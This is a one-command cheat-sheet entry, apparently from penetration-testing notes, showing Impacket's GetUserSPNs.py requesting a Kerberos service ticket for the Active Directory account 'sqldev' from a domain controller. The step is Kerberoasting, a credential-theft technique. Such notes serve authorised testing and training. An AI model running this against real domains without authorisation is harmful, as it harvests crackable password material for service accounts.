# Request Kerberos Ticket for Specific User

OS: Active_Directory, Linux
Description: Request Kerberos Ticket for Specific User.
...
```jsx
GetUserSPNs.py -dc-ip 172.16.5.5 TARGETDOMAIN.LOCAL/ -request-user sqldev
```